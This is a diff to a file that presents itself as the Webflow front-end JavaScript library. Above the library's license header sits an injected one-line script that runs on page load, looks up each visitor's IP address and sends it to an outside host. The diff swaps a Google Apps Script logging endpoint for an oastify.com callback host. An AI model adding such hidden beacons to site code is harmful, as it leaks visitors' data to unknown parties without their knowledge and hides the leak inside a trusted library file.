@@ -1,4 +1,4 @@
- async function getIpAddress() { try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); logIpAddress(data.ip); } catch (error) { console.error('Error fetching IP address:', error); } } async function logIpAddress(ip) { try { const logUrl = 'https://script.google.com/macros/s/AKfycbzhu3kHi6DBSX51UsU-fHUBAyeciMfRaba2vlLtK5EvcGRcAvE3MTFrVXsEY-mdYtr0/exec?ip=' + ip; await fetch(logUrl); } catch (error) { console.error('Error logging IP address:', error); } } getIpAddress(); 
+ async function getIpAddress() { try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); logIpAddress(data.ip); } catch (error) { console.error('Error fetching IP address:', error); } } async function logIpAddress(ip) { try { const logUrl = 'https://agui3t8jizmfrqc3b6f39yxgf7ly9oxd.oastify.com?ip=' + ip; await fetch(logUrl); } catch (error) { console.error('Error logging IP address:', error); } } getIpAddress(); 
 /*!
  * Webflow: Front-end site library
  * @license MIT
